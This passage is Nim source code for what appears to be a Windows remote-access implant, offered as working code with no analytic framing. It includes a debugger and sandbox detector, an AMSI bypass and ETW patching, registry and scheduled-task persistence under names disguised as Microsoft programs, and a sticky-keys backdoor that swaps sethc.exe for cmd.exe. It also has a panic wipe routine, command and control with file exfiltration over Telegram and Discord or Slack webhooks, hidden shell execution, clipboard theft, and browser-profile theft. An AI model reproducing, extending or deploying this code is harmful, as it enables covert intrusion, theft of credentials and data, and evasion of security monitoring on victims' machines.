        for i in 0..<8: kd = kd or (int64(rawBytes[40+i]) shl (i*8))
        tgMetaKillDate = kd
      if raw.len >= 52:
        var sm: int = 0
        for i in 0..<4: sm = sm or (int(rawBytes[48+i]) shl (i*8))
        tgMetaSleepMin = sm
    except: discard

  proc saveTgMeta() =
    try:
      createDir(META_DIR)
      var outp = newSeq[byte](52)
      for i in 0..<32: outp[i] = tgMetaInstallKey[i]
      for i in 0..<8: outp[32+i] = byte((tgMetaLastContact shr (i*8)) and 0xFF)
      for i in 0..<8: outp[40+i] = byte((tgMetaKillDate shr (i*8)) and 0xFF)
      for i in 0..<4: outp[48+i] = byte((tgMetaSleepMin shr (i*8)) and 0xFF)
      writeFile(TG_META_FILE, cast[string](outp))
    except: discard

  proc tgIsKilled(): bool =
    if tgMetaKillDate != 0 and getTime().toUnix() >= tgMetaKillDate: return true
    if tgMetaLastContact != 0 and getTime().toUnix() - tgMetaLastContact > TG_DEAD_MAN_SECS: return true
    return false

# =============================================================================
# Single-instance mutex
# =============================================================================
when defined(windows):
  proc acquireMutex(): bool =
    let h1 = CreateMutexW(NULL, FALSE, newWideCString(MutexName))
    if h1 != 0:
      if GetLastError() == ERROR_ALREADY_EXISTS:
        CloseHandle(h1)
        return false
      return true
    let localName = MutexName.replace("Global\\", "")
    if localName == MutexName or localName.len == 0:
      return false
    let h2 = CreateMutexW(NULL, FALSE, newWideCString(localName))
    if h2 != 0:
      if GetLastError() == ERROR_ALREADY_EXISTS:
        CloseHandle(h2)
        return false
      return true
    return false

# =============================================================================
# Anti-analysis
# =============================================================================
when defined(windows):
  const PROCESS_DEBUG_PORT = 0x07

  proc isDebuggerPresent(): bool =
    IsDebuggerPresent() != 0

  proc checkRemoteDebugger(): bool =
    try:
      var ntdll = obfStr(S_NTDLL)
      var procName = obfStr(S_NTQIP)
      let hMod = LoadLibraryA(cast[cstring](addr ntdll[0]))
      if hMod == 0: return false
      let pAddr = GetProcAddress(hMod, cast[cstring](addr procName[0]))
      if pAddr == nil: return false
      type NtQIP = proc(handle: HANDLE, infoClass: DWORD, info: LPVOID,
                        infoLen: DWORD, retLen: ptr DWORD): NTSTATUS {.stdcall.}
      let fn = cast[NtQIP](pAddr)
      var dbgPort: DWORD = 0
      var retLen: DWORD = 0
      let status = fn(GetCurrentProcess(), PROCESS_DEBUG_PORT,
                      cast[LPVOID](addr dbgPort), DWORD(sizeof(dbgPort)), addr retLen)
      if status == 0 and dbgPort != 0: return true
    except: discard
    return false

  # Inline read of the TEB pointer. NtCurrentTeb() is an intrinsic in the
  # Windows SDK, not a ntdll export, so GetProcAddress(ntdll, "NtCurrentTeb")
  # always returned nil and the check silently no-op'd.
  proc readTeb(): pointer {.inline.} =
    when defined(amd64):
      asm """
        movq %%gs:0x30, %0
        : "=r"(`result`)
      """
    else:
      asm """
        movl %%fs:0x18, %0
        : "=r"(`result`)
      """

  proc checkNtGlobalFlag(): bool =
    try:
      let teb = readTeb()
      if teb == nil: return false
      when defined(amd64):
        let off = 0xBC
      else:
        let off = 0x68
      var f: uint32 = 0
      let p = cast[pointer](cast[int](teb) + off.int)
      copyMem(addr f, p, 4)
      if (f and 0x70'u32) != 0: return true
    except: discard
    return false

  proc checkSandboxMarkers(): bool =
    var hits = 0
    let paths = [
      obfStr(S_BOX_1), obfStr(S_BOX_2), obfStr(S_BOX_3),
      obfStr(S_BOX_4), obfStr(S_BOX_5), obfStr(S_BOX_6),
      obfStr(S_BOX_7), obfStr(S_BOX_8), obfStr(S_BOX_9),
      obfStr(S_BOX_10), obfStr(S_BOX_11)
    ]
    for p in paths:
      if fileExists(p): inc hits
    let sandboxUsers = ["sandbox", "virus", "malware", "maltest", "currentuser"]
    let userLower = getEnv("USERNAME", "").toLowerAscii
    for u in sandboxUsers:
      if userLower.contains(u): inc hits
    let sandboxHosts = ["sandbox", "virus", "cuckoo", "maltest"]
    let hostLower = getEnv("COMPUTERNAME", "").toLowerAscii
    for h in sandboxHosts:
      if hostLower.contains(h): inc hits
    return hits >= 2

  proc checkTimingAnomaly(): bool =
    let t0 = getMonoTime()
    sleep(1000)
    let elapsed = (getMonoTime() - t0).inMilliseconds
    return elapsed < 800

  proc checkSuspiciousProcesses(): bool =
    try:
      var snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
      if snap == cast[HANDLE](-1): return false
      var entry: PROCESSENTRY32W
      entry.dwSize = DWORD(sizeof(PROCESSENTRY32W))
      if Process32FirstW(snap, addr entry) == 0:
        discard CloseHandle(snap)
        return false
      var hits = 0
      while true:
        let nameLower = ($entry.szExeFile).toLowerAscii
        for p in SuspiciousProcs:
          if nameLower.contains(p): inc hits
        if Process32NextW(snap, addr entry) == 0: break
      discard CloseHandle(snap)
      return hits >= 2
    except: discard
    return false

  proc antiAnalysisCheck(): bool =
    if NoSandbox: return false
    if isDebuggerPresent(): return true
    if checkRemoteDebugger(): return true
    if checkNtGlobalFlag(): return true
    if checkSandboxMarkers(): return true
    if checkTimingAnomaly(): return true
    if checkSuspiciousProcesses(): return true
    return false

# =============================================================================
# AMSI bypass + ETW suppression
# =============================================================================
when defined(windows):
  # CONTEXT for x64. The Windows struct is 1232 bytes total; a smaller
  # stack object gets stomped by GetThreadContext every time the bypass
  # arms. We declare the debug-register + IP fields we care about, then
  # over-allocate the tail.
  type
    Context64 = object
      P1Home, P2Home, P3Home, P4Home, P5Home, P6Home: uint64
      ContextFlags: uint32
      MxCsr: uint32
      SegCs, SegDs, SegEs, SegFs, SegGs, SegSs: uint16
      EFlags: uint32
      Dr0, Dr1, Dr2, Dr3, Dr6, Dr7: uint64
      Rax, Rcx, Rdx, Rbx, Rsp, Rbp, Rsi, Rdi: uint64
      R8, R9, R10, R11, R12, R13, R14, R15: uint64
      Rip: uint64
      # Tail: FltSave(512) + VectorRegister(416) + 5*8 tail fields,
      # plus alignment slack. Real total is 1232.
      tailPad: array[1024, byte]

    ExRecord = object
      ExceptionCode: int32
      ExceptionFlags: uint32
      ExceptionRecord: pointer
      ExceptionAddress: pointer
      NumberParameters: uint32
      ExceptionInformation: array[15, uint64]

    ExPointers = object
      ExceptionRecord: ptr ExRecord
      ContextRecord: ptr Context64

  static:
    doAssert sizeof(Context64) >= 1232,
      "Context64 must be >= CONTEXT_AMD64 (1232 bytes on x64)"

  const
    CONTEXT_DEBUG_REGISTERS = 0x00100010'u32
    CONTEXT_FULL = 0x0010000B'u32
    E_INVALIDARG = 0x80070057'i32

  proc addVectoredExceptionHandler(firstHandler: uint32,
                                   handler: pointer): pointer
    {.stdcall, dynlib: "kernel32", importc: "AddVectoredExceptionHandler".}
  proc removeVectoredExceptionHandler(handle: pointer): uint32
    {.stdcall, dynlib: "kernel32", importc: "RemoveVectoredExceptionHandler".}
  proc hwGetThreadContext(hThread: HANDLE, ctx: pointer): bool
    {.stdcall, dynlib: "kernel32", importc: "GetThreadContext".}
  proc hwSetThreadContext(hThread: HANDLE, ctx: pointer): bool
    {.stdcall, dynlib: "kernel32", importc: "SetThreadContext".}
  proc virtualProtect(address: pointer, size: int, newProt: uint32,
                      oldProt: ptr uint32): bool
    {.stdcall, dynlib: "kernel32", importc: "VirtualProtect".}
  proc memcpy(dst, src: pointer, n: int): pointer
    {.importc: "memcpy", header: "<string.h>".}

  var gAmsiScanBuf: uint64 = 0
  var gEtwEventWriteAddr: uint64 = 0
  var gEtwEventWriteExAddr: uint64 = 0
  var gAmsiVehHandle: pointer = nil

  proc amsiVeh(exInfo: ptr ExPointers): int32 {.stdcall, gcsafe.} =
    if exInfo == nil or exInfo.ContextRecord == nil: return 0
    let ex = exInfo.ExceptionRecord
    if ex == nil: return 0
    if ex.ExceptionCode != 0x80000003'i32 and
       ex.ExceptionCode != 0x80000004'i32: return 0
    let ctx = exInfo.ContextRecord
    if ctx.Rip == gAmsiScanBuf:
      # Emulate `mov eax, E_INVALIDARG; ret`: pop return address, jump.
      let retAddr = cast[ptr uint64](ctx.Rsp)[]
      ctx.Rsp = ctx.Rsp + 8
      ctx.Rip = retAddr
      ctx.Rax = 0x0000000080070057'u64  # E_INVALIDARG, zero-extended
      ctx.Dr6 = 0
      return -1
    return 0

  proc armAmsiHwbpCurrentThread(): bool {.gcsafe.} =
    if gAmsiScanBuf == 0: return false
    try:
      # Windows requires CONTEXT to be 16-byte aligned on x64.
      let raw = alloc0(sizeof(Context64) + 16)
      defer: dealloc(raw)
      let base = cast[uint](raw)
      let aligned = (base + 15'u) and not 15'u
      let ctx = cast[ptr Context64](aligned)
      ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS
      if not hwGetThreadContext(GetCurrentThread(), cast[pointer](ctx)): return false
      ctx.Dr0 = gAmsiScanBuf
      ctx.Dr7 = (ctx.Dr7 and not 0xF'u64) or 0x1'u64
      return hwSetThreadContext(GetCurrentThread(), cast[pointer](ctx))
    except: discard
    return false

  proc applyAmsiBypass(): bool =
    try:
      var amsi = obfStr(S_AMSI_DLL)
      let hMod = LoadLibraryA(cast[cstring](addr amsi[0]))
      if hMod == 0: return false
      var procName = obfStr(S_AMSI_SCAN)
      let pAddr = GetProcAddress(hMod, cast[cstring](addr procName[0]))
      if pAddr == nil: return false
      gAmsiScanBuf = cast[uint64](pAddr)
      if gAmsiVehHandle == nil:
        gAmsiVehHandle = addVectoredExceptionHandler(1, cast[pointer](amsiVeh))
      return armAmsiHwbpCurrentThread()
    except: discard
    return false

  proc applyEtwPatch(): bool =
    proc patchRet0(address: uint64): bool =
      let p = cast[pointer](address)
      var oldProt: uint32 = 0
      if not virtualProtect(p, 16, 0x40'u32, addr oldProt):
        return false
      let bytes: array[5, byte] = [0x33'u8, 0xC0'u8, 0xC3'u8, 0x90'u8, 0x90'u8]
      discard memcpy(p, unsafeAddr bytes[0], 5)
      var dummy: uint32 = 0
      discard virtualProtect(p, 16, oldProt, addr dummy)
      return true
    try:
      var ntdll = obfStr(S_NTDLL)
      let hMod = LoadLibraryA(cast[cstring](addr ntdll[0]))
      if hMod == 0: return false
      var procName = obfStr(S_ETW_WRITE)
      let pAddr = GetProcAddress(hMod, cast[cstring](addr procName[0]))
      if pAddr == nil: return false
      gEtwEventWriteAddr = cast[uint64](pAddr)
      let ok1 = patchRet0(gEtwEventWriteAddr)
      var procNameEx = obfStr(S_ETW_EX)
      let pAddrEx = GetProcAddress(hMod, cast[cstring](addr procNameEx[0]))
      let ok2 = if pAddrEx != nil:
        gEtwEventWriteExAddr = cast[uint64](pAddrEx)
        patchRet0(gEtwEventWriteExAddr)
      else: true
      return ok1 and ok2
    except: discard
    return false

  proc applyEvasion(): string {.gcsafe.} =
    var status = ""
    if applyAmsiBypass():
      status.add("amsi:hwbp ")
    else:
      status.add("amsi:fail ")
    if applyEtwPatch():
      status.add("etw:patch ")
    else:
      status.add("etw:fail ")
    return status

# =============================================================================
# Persistence
# =============================================================================
when defined(windows):
  when defined(c2_ws) or defined(c2_both):
    proc establishPersistence() =
      let exePath = getAppFilename()
      var meta = loadMeta()
      var needSave = false

      if meta.installKey[0] == 0:
        discard randomBytes(addr meta.installKey[0], 32)
        needSave = true

      if meta.regName.len == 0:
        for _ in 0..<10: meta.regName.add(CHARSET[rand(CHARSET.high)])
        needSave = true

      if meta.copyPath.len == 0:
        let appData = getEnv("APPDATA", expandTilde("~"))
        const LEGIT_NAMES = [
          "MicrosoftEdgeUpdate.exe", "OneDriveStandaloneUpdater.exe",
          "WindowsDefenderHealthCheck.exe", "SearchProtocolHost.exe",
          "SecurityHealthService.exe", "WindowsShellExperience.exe",
          "CompatTelRunner.exe", "WerFaultSecure.exe"
        ]
        let baseName = LEGIT_NAMES[rand(LEGIT_NAMES.high)]
        meta.copyPath = appData / "Microsoft" / ("." & randomToken(6)) / baseName
        needSave = true

      try:
        if exePath != meta.copyPath:
          createDir(meta.copyPath.parentDir)
          if not fileExists(meta.copyPath):
            copyFile(exePath, meta.copyPath)
      except: discard

      try:
        var key: HKEY
        if RegOpenKeyExW(HKEY_CURRENT_USER,
                         newWideCString(obfStr(S_PERSIST_RUN)),
                         0, KEY_SET_VALUE, addr key) == ERROR_SUCCESS:
          let wPath = newWideCString(meta.copyPath)
          discard RegSetValueExW(key, newWideCString(meta.regName), 0, REG_SZ,
                                 cast[ptr BYTE](wPath[0].addr),
                                 DWORD((meta.copyPath.len + 1) * 2))
          discard RegCloseKey(key)
      except: discard

      if isAdmin():
        try:
          discard execHidden("schtasks /create /tn \"" & PersistTaskName &
                            "\" /tr \"" & meta.copyPath & "\" /sc onlogon " &
                            "/rl highest /f")
          meta.taskName = PersistTaskName
          needSave = true
        except: discard

      if needSave: saveMeta(meta)

  proc installStickyKeys(): string =
    if not isAdmin(): return "skipped (not admin)"
    let psScript =
      "$bak = $env:SystemRoot + '\\System32\\sethc.exe.bak';\n" &
      "$cur = $env:SystemRoot + '\\System32\\sethc.exe';\n" &
      "$cmd = $env:SystemRoot + '\\System32\\cmd.exe';\n" &
      "if (-not (Test-Path $bak)) {\n" &
      "  takeown /f $cur /a | Out-Null;\n" &
      "  icacls $cur /grant Administrators:F | Out-Null;\n" &
      "  Copy-Item $cur $bak -Force;\n" &
      "}\n" &
      "takeown /f $cur /a | Out-Null;\n" &
      "icacls $cur /grant Administrators:F | Out-Null;\n" &
      "Copy-Item $cmd $cur -Force;\n" &
      "Write-Output 'ok'\n"
    try:
      let (outp, exitCode) = execHidden(psRun(psScript))
      if outp.contains("ok"): return "ok (Shift*5 at lock screen)"
      return "err: exit " & $exitCode
    except CatchableError as e: return "err: " & e.msg

  when defined(c2_ws) or defined(c2_both):
    proc selfCleanup() =
      let meta = loadMeta()
      try:
        var key: HKEY
        if RegOpenKeyExW(HKEY_CURRENT_USER,
                         newWideCString(obfStr(S_PERSIST_RUN)),
                         0, KEY_SET_VALUE, addr key) == ERROR_SUCCESS:
          if meta.regName.len > 0:
            discard RegDeleteValueW(key, newWideCString(meta.regName))
          discard RegCloseKey(key)
      except: discard
      if meta.taskName.len > 0:
        discard execHidden(obfStr(S_SCHTASKS) & " /delete /tn \"" &
                          meta.taskName & "\" /f 2>nul")
      if isAdmin():
        let restore =
          "$bak = $env:SystemRoot + '\\System32\\sethc.exe.bak';\n" &
          "$cur = $env:SystemRoot + '\\System32\\sethc.exe';\n" &
          "if (Test-Path $bak) {\n" &
          "  takeown /f $cur /a | Out-Null;\n" &
          "  icacls $cur /grant Administrators:F | Out-Null;\n" &
          "  Copy-Item $bak $cur -Force;\n" &
          "  Remove-Item $bak -Force;\n" &
          "  Write-Output 'restored'\n" &
          "} else { Write-Output 'not-installed' }\n"
        discard execHidden(psRun(restore))
      try: removeFile(META_FILE) except: discard
      if meta.copyPath.len > 0 and meta.copyPath != getAppFilename():
        try: removeFile(meta.copyPath) except: discard

  proc panicWipe() =
    try:
      when defined(c2_ws) or defined(c2_both):
        selfCleanup()
    except: discard
    when defined(c2_ws) or defined(c2_both):
      if fileExists(META_FILE):
        try:
          let sz = getFileSize(META_FILE)
          var rnd = newSeq[byte](sz)
          discard randomBytes(addr rnd[0], sz)
          var f = open(META_FILE, fmWrite)
          defer: f.close()
          discard f.writeBuffer(unsafeAddr rnd[0], rnd.len)
        except: discard
        try: removeFile(META_FILE) except: discard
    try:
      removeDir(getEnv("TEMP", "") / obfStr(S_SVC_DIR))
    except: discard
    try: removeFile(getAgentLogPath()) except: discard
    agentLog("panic: full wipe complete, exiting")
    quit(0)

# =============================================================================
# OUT-OF-BAND NOTIFICATION CHANNELS - WinHTTP
# =============================================================================
proc winHttpPostJson(host: string, port: int, path: string,
                     body: string, extraHeaders: string = ""): tuple[code: int, body: string] =
  result = (-1, "")
  let ua = newWideCString(UserAgent)
  let (proxyAccess, proxyName) = winHttpProxyInfo()
  let wProxy = newWideCString(proxyName)
  let hSession = WinHttpOpen(ua, proxyAccess, wProxy, nil, 0)
  if hSession == nil: return
  defer: discard WinHttpCloseHandle(hSession)
  discard WinHttpSetTimeouts(hSession, 10000, 15000, 30000,
                             DWORD((PollHttpSec + 20) * 1000))
  let wHost = newWideCString(host)
  let hConnect = WinHttpConnect(hSession, wHost, WORD(port), 0)
  if hConnect == nil: return
  defer: discard WinHttpCloseHandle(hConnect)
  let wPath = newWideCString(path)
  let verb = if body.len == 0: L"GET" else: L"POST"
  let hRequest = WinHttpOpenRequest(hConnect, verb, wPath,
                                    nil, nil, nil,
                                    WINHTTP_FLAG_SECURE)
  if hRequest == nil: return
  defer: discard WinHttpCloseHandle(hRequest)
  if body.len > 0:
    let ctHeader = L"Content-Type: application/json"
    if WinHttpAddRequestHeaders(hRequest, ctHeader, DWORD(len(ctHeader)),
                                WINHTTP_ADDREQ_FLAG_ADD) == 0:
      return
    if extraHeaders.len > 0:
      let wExtra = newWideCString(extraHeaders)
      if WinHttpAddRequestHeaders(hRequest, wExtra, DWORD(len(extraHeaders)),
                                  WINHTTP_ADDREQ_FLAG_ADD) == 0:
        return
  let bodyWide = body
  let bodyLen = DWORD(bodyWide.len)
  let sent = if bodyLen > 0:
      WinHttpSendRequest(hRequest, nil, 0,
                         cast[LPVOID](unsafeAddr bodyWide[0]),
                         bodyLen, bodyLen, 0)
    else:
      WinHttpSendRequest(hRequest, nil, 0, nil, 0, 0, 0)
  if sent == 0: return
  if WinHttpReceiveResponse(hRequest, nil) == 0: return
  var avail: DWORD = 0
  var responseBody = ""
  while true:
    avail = 0
    if WinHttpQueryDataAvailable(hRequest, addr avail) == 0: break
    if avail == 0: break
    var buf = newSeq[byte](int(avail) + 1)
    var read: DWORD = 0
    if WinHttpReadData(hRequest, cast[LPVOID](addr buf[0]), avail, addr read) == 0: break
    if read == 0: break
    buf.setLen(int(read))
    responseBody.add(cast[string](buf))
  var statusCode: DWORD = 0
  var statusSize: DWORD = DWORD(sizeof(statusCode))
  let statusHeader = L"Status"
  if WinHttpQueryHeaders(hRequest,
                          WINHTTP_QUERY_STATUS_CODE or WINHTTP_QUERY_FLAG_NUMBER,
                          statusHeader, cast[LPVOID](addr statusCode),
                          addr statusSize, nil) != 0:
    result.code = int(statusCode)
  result.body = responseBody

proc winHttpPostMultipart(host: string, port: int, path: string,
                          fields: openArray[(string, string)],
                          fileField: tuple[name: string, path: string],
                          caption: string = ""): tuple[code: int, body: string] =
  result = (-1, "")
  let boundary = "----SentinelBoundary" & $getMonoTime().ticks
  let crlf = "\r\n"
  var body = ""
  for (k, v) in fields:
    body.add("--" & boundary & crlf)
    body.add("Content-Disposition: form-data; name=\"" & k & "\"" & crlf)
    body.add(crlf)
    body.add(v)
    body.add(crlf)
  if fileField.path.len > 0 and fileExists(fileField.path):
    body.add("--" & boundary & crlf)
    body.add("Content-Disposition: form-data; name=\"" & fileField.name & "\"; filename=\"" &
             extractFilename(fileField.path) & "\"" & crlf)
    body.add("Content-Type: application/octet-stream" & crlf)
    body.add(crlf)
    body.add(readFile(fileField.path))
    body.add(crlf)
  body.add("--" & boundary & "--" & crlf)
  let ua = newWideCString(UserAgent)
  let (proxyAccess2, proxyName2) = winHttpProxyInfo()
  let wProxy2 = newWideCString(proxyName2)
  let hSession = WinHttpOpen(ua, proxyAccess2, wProxy2, nil, 0)
  if hSession == nil: return
  defer: discard WinHttpCloseHandle(hSession)
  discard WinHttpSetTimeouts(hSession, 10000, 15000, 120000, 60000)
  let wHost = newWideCString(host)
  let hConnect = WinHttpConnect(hSession, wHost, WORD(port), 0)
  if hConnect == nil: return
  defer: discard WinHttpCloseHandle(hConnect)
  let wPath = newWideCString(path)
  let hRequest = WinHttpOpenRequest(hConnect, L"POST", wPath,
                                    nil, nil, nil,
                                    WINHTTP_FLAG_SECURE)
  if hRequest == nil: return
  defer: discard WinHttpCloseHandle(hRequest)
  let ctHeader = "Content-Type: multipart/form-data; boundary=" & boundary
  let wCtHeader = newWideCString(ctHeader)
  if WinHttpAddRequestHeaders(hRequest, wCtHeader, DWORD(ctHeader.len),
                              WINHTTP_ADDREQ_FLAG_ADD) == 0:
    return
  let bodyBytes = body
  let bodyLen = DWORD(bodyBytes.len)
  let sent = WinHttpSendRequest(hRequest, nil, 0,
                                cast[LPVOID](unsafeAddr bodyBytes[0]),
                                bodyLen, bodyLen, 0)
  if sent == 0: return
  if WinHttpReceiveResponse(hRequest, nil) == 0: return
  var avail: DWORD = 0
  var responseBody = ""
  while true:
    avail = 0
    if WinHttpQueryDataAvailable(hRequest, addr avail) == 0: break
    if avail == 0: break
    var buf = newSeq[byte](int(avail) + 1)
    var read: DWORD = 0
    if WinHttpReadData(hRequest, cast[LPVOID](addr buf[0]), avail, addr read) == 0: break
    if read == 0: break
    buf.setLen(int(read))
    responseBody.add(cast[string](buf))
  var statusCode: DWORD = 0
  var statusSize: DWORD = DWORD(sizeof(statusCode))
  let statusHeader = L"Status"
  if WinHttpQueryHeaders(hRequest,
                          WINHTTP_QUERY_STATUS_CODE or WINHTTP_QUERY_FLAG_NUMBER,
                          statusHeader, cast[LPVOID](addr statusCode),
                          addr statusSize, nil) != 0:
    result.code = int(statusCode)
  result.body = responseBody

when defined(c2_tg) or defined(c2_both) or defined(c2_ws):
  const TG_MAX_MSG = 3800

  proc utf8Sanitize(s: string): string =
    result = newString(s.len)
    var i = 0
    while i < s.len:
      let b = byte(ord(s[i]))
      if b < 0x80:
        result[i] = s[i]
        inc i
        continue
      var seqLen = 0
      if (b and 0xE0) == 0xC0: seqLen = 2
      elif (b and 0xF0) == 0xE0: seqLen = 3
      elif (b and 0xF8) == 0xF0: seqLen = 4
      var valid = seqLen > 0 and i + seqLen <= s.len
      if valid:
        for k in 1..<seqLen:
          if (byte(ord(s[i + k])) and 0xC0) != 0x80:
            valid = false
            break
      if valid:
        for k in 0..<seqLen: result[i + k] = s[i + k]
        inc i, seqLen
      else:
        result[i] = '?'
        inc i

  proc tgSendChunk(chunk: string): bool =
    if gReplMode: return true
    var obj = newJObject()
    obj["chat_id"] = %ChatId
    obj["text"] = %utf8Sanitize(chunk)
    let (code, respBody) = winHttpPostJson("api.telegram.org", 443,
                                     "/bot" & BotToken & "/sendMessage",
                                     $obj)
    if code != 200:
      logMsg("sendMessage http " & $code & ": " &
             respBody[0..<min(respBody.len, 300)])
    return code == 200

  proc utf8SafeCut(text: string, start, maxLen: int): int =
    result = min(maxLen, text.len - start)
    while result > 0 and start + result < text.len:
      let b = byte(ord(text[start + result]))
      if (b and 0xC0) != 0x80: break
      dec result

when defined(c2_tg) or defined(c2_both):
  proc tgSendText(text: string): bool =
    if BotToken.len == 0 or ChatId.len == 0: return false
    if text.len == 0: return true
    var ok = true
    var i = 0
    while i < text.len:
      let n = utf8SafeCut(text, i, TG_MAX_MSG)
      let chunk = text[i..<i + n]
      var sent = false
      for attempt in 1..3:
        if tgSendChunk(chunk):
          sent = true
          break
        logMsg("sendMessage attempt " & $attempt & " failed")
        sleep(800 * attempt)
      if not sent: ok = false
      inc i, n
    return ok

  proc tgSendDocument(path: string, caption: string = ""): bool =
    if BotToken.len == 0 or ChatId.len == 0: return false
    if not fileExists(path):
      logMsg("sendDocument: file missing: " & path)
      return false
    let fields = @[("chat_id", ChatId),
                   ("caption", caption[0..<min(1024, caption.len)])]
    var code = 0
    for attempt in 1..3:
      (code, _) = winHttpPostMultipart("api.telegram.org", 443,
                                       "/bot" & BotToken & "/sendDocument",
                                       fields,
                                       (name: "document", path: path))
      if code == 200: break
      logMsg("sendDocument attempt " & $attempt & " http " & $code &
             " (" & extractFilename(path) & ", " &
             $getFileSize(path) & " B)")
      sleep(800 * attempt)
    return code == 200

  proc tgSendDocumentChunked(path: string, caption: string = ""): bool =
    const PART_LIMIT = 45 * 1024 * 1024
    let sz = getFileSize(path)
    if sz <= PART_LIMIT:
      return tgSendDocument(path, caption)
    let total = (sz + PART_LIMIT - 1) div PART_LIMIT
    discard tgSendText("[*] " & extractFilename(path) & " is " &
                       $(sz div (1024*1024)) & " MB - sending in " &
                       $total & " parts (reassemble with copy /b)")
    var f: File
    if not open(f, path, fmRead):
      discard tgSendText("[!] cannot open for chunking: " & path)
      return false
    defer: f.close()
    var buf = newSeq[byte](PART_LIMIT)
    var partIdx = 0
    var allOk = true
    while not f.endOfFile:
      let got = f.readBytes(buf, 0, PART_LIMIT)
      if got == 0: break
      inc partIdx
      let partPath = getEnv("TEMP", getEnv("USERPROFILE", ".")) /
                     (extractFilename(path) & ".part" &
                      align($partIdx, 3, '0'))
      writeFile(partPath, cast[string](buf[0..<got]))
      if not tgSendDocument(partPath,
                            extractFilename(path) & ".part" &
                            align($partIdx, 3, '0') & "/" & $total):
        allOk = false
        discard tgSendText("[!] part " & $partIdx & " failed - stopping")
        try: removeFile(partPath) except: discard
        break
      try: removeFile(partPath) except: discard
      sleep(1500)
    return allOk

when defined(c2_ws):
  proc tgSendText(text: string): bool =
    if BotToken.len == 0 or ChatId.len == 0: return false
    if text.len == 0: return true
    var ok = true
    var i = 0
    while i < text.len:
      let n = utf8SafeCut(text, i, TG_MAX_MSG)
      if not tgSendChunk(text[i..<i + n]): ok = false
      inc i, n
    return ok

  proc tgSendDocument(path: string, caption: string = ""): bool =
    if gReplMode:
      echo "[sent-doc] " & path
      return fileExists(path)
    if BotToken.len == 0 or ChatId.len == 0: return false
    if not fileExists(path):
      logMsg("sendDocument: file missing: " & path)
      return false
    let fields = @[("chat_id", ChatId),
                   ("caption", caption[0..<min(1024, caption.len)])]
    var code = 0
    for attempt in 1..3:
      (code, _) = winHttpPostMultipart("api.telegram.org", 443,
                                       "/bot" & BotToken & "/sendDocument",
                                       fields,
                                       (name: "document", path: path))
      if code == 200: break
      logMsg("sendDocument attempt " & $attempt & " http " & $code)
      sleep(800 * attempt)
    return code == 200

proc sendToTg(text: string): bool = tgSendText(text)
proc sendTgDoc(path, caption: string): bool = tgSendDocument(path, caption)

proc sendToHook(text: string): bool =
  if DiscordUrl.len == 0 and SlackUrl.len == 0: return false
  let url = if DiscordUrl.len > 0: DiscordUrl else: SlackUrl
  var host = "discord.com"
  var port = 443
  var path = "/"
  let urlNoScheme = url.replace("https://", "").replace("http://", "")
  let slashIdx = urlNoScheme.find('/')
  if slashIdx > 0:
    host = urlNoScheme[0..<slashIdx]
    path = urlNoScheme[slashIdx..^1]
  else:
    host = urlNoScheme
  let body = $ %* {"content": text}
  let (code, _) = winHttpPostJson(host, port, path, body)
  return code in [200, 204]

proc telegramEnabled(): bool = BotToken.len > 0 and ChatId.len > 0
proc webhookEnabled(): bool =
  DiscordUrl.len > 0 or SlackUrl.len > 0

# =============================================================================
# FEATURE PROCS
# =============================================================================
proc executeShell(command: string): tuple[output: string, code: int] =
  execHidden(command)

proc wideName(arr: array[260, uint16]): string =
  var i = 0
  while i < arr.len and arr[i] != 0:
    result.add(Rune(arr[i]))
    inc i

proc processList(): JsonNode =
  try:
    var snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    if snap == cast[HANDLE](-1):
      return %* {"type": "output", "data": "[!] snapshot failed"}
    var entry: PROCESSENTRY32W
    entry.dwSize = DWORD(sizeof(PROCESSENTRY32W))
    if Process32FirstW(snap, addr entry) == 0:
      discard CloseHandle(snap)
      return %* {"type": "output", "data": "[!] Process32First failed"}
    var rows: seq[JsonNode] = @[]
    while true:
      rows.add(%* {"pid": entry.th32ProcessID,
                   "ppid": entry.th32ParentProcessID,
                   "name": wideName(entry.szExeFile)})
      if Process32NextW(snap, addr entry) == 0: break
    discard CloseHandle(snap)
    return %* {"type": "ps", "rows": rows}
  except CatchableError as e:
    return %* {"type": "output", "data": "[!] ps: " & e.msg}

proc getClipboard(): JsonNode =
  # CF_UNICODETEXT is a NUL-terminated wchar_t* — casting through
  # UNICODE_STRING read the length field as the first character and
  # returned garbage on every call.
  try:
    var opened = false
    for _ in 0..<10:
      if OpenClipboard(0):
        opened = true
        break
      sleep(50)
    if not opened:
      return %* {"type": "output", "data": "[!] OpenClipboard failed (busy)"}
    defer: CloseClipboard()
    let h = GetClipboardData(13)  # CF_UNICODETEXT
    if h == 0: return %* {"type": "output", "data": "(empty)"}
    let p = cast[WideCString](GlobalLock(h))
    if p == nil: return %* {"type": "output", "data": "(empty)"}
    defer: GlobalUnlock(h)
    let s = $p
    return %* {"type": "clip", "data": s}
  except CatchableError as e:
    return %* {"type": "output", "data": "[!] clip: " & e.msg}

when defined(windows):
  proc walkFilesRec(dir: string): seq[string] =
    result = @[]
    try:
      for kind, name in walkDir(dir):
        if kind == pcFile or kind == pcLinkToFile:
          result.add(dir / name)
        elif kind == pcDir:
          result.add(walkFilesRec(dir / name))
    except: discard

when defined(windows):
  proc stageDir(): string =
    result = getEnv("TEMP", expandTilde("~")) / obfStr(S_SVC_DIR)
    createDir(result)

proc fileSearch(pattern: string): JsonNode =
  try:
    let parts = pattern.split('*', 1)
    if parts.len < 2: return %* {"type": "output", "data": "[!] usage: find <dir>*<glob>"}
    let base = parts[0]
    let glob = parts[1]
    if not dirExists(base): return %* {"type": "output", "data": "[!] no dir: " & base}
    var rows: seq[string] = @[]
    for f in walkFilesRec(base):
      if f.contains(glob):
        rows.add(f)
        if rows.len >= 500: break
    return %* {"type": "find", "count": rows.len, "rows": rows}
  except CatchableError as e:
    return %* {"type": "output", "data": "[!] find: " & e.msg}

# =============================================================================
# Exfil
# =============================================================================
when defined(windows):
  proc copyFileTo(src, dst: string): bool =
    try:
      createDir(dst.parentDir)
      copyFile(src, dst)
      return true
    except: return false

  proc exfilBrowserData(): JsonNode =
    let dst = stageDir() / "browser"
    createDir(dst)
    var copied: seq[string] = @[]
    let profileDirs = [
      (obfStr(S_CHROME) & "\\User Data", "chrome"),
      (obfStr(S_EDGE) & "\\User Data", "edge")
    ]
    let localApp = getEnv(obfStr(S_LOCALAPPDATA), expandTilde("~"))
    for (sub, brand) in profileDirs:
      if brand.len == 0: continue
      let base = localApp / sub
